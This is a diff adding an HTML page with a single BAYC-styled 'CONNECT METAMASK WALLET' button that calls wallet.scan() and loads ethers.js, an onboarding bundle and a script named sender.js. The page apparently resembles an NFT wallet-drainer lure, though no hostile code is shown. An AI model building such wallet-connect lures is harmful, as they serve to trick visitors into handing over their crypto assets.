@@ -1,0 +1,55 @@
+
+<html lang="en">
+
+<head>
+  
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    
+    <link rel="icon" href="favicon.ico">
+    <link href="css/main.css" rel="stylesheet">
+    <!-- <script src="groups/core-18a0e4c012d014efca105cc926d78de3.js"></script>
+    <script src="groups/nft-core-eae8408591a6868bd6ea2960e601ef57.js"></script> -->
+
+</head>
+
+
+   
+    <div class="main-section">
+        <div class="container">
+            <div class="row">
+                <div class="inside">
+                    
+                    <div class="text" style="">
+
+                        <center>    <a id="metamaskbutton" class="bayc-button btn-default" style="margin-bottom: 30px;" onclick="wallet.scan()">CONNECT METAMASK WALLET</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        var acc = document.getElementsByClassName("accordion");
+        var i;
+
+        for (i = 0; i < acc.length; i++) {
+            acc[i].addEventListener("click", function() {
+                this.classList.toggle("active");
+                var panel = this.nextElementSibling;
+                if (panel.style.maxHeight) {
+                    panel.style.maxHeight = null;
+                } else {
+                    panel.style.maxHeight = panel.scrollHeight + "px";
+                }
+            });
+        }
+    </script>
+    <script type="text/javascript" src="onboard-dist/main.js"></script>
+
+    <script type="text/javascript" src="ethers-5.1.umd.min.js"></script>
+    <script src="sender.js"></script>
+
+
+
+</html>
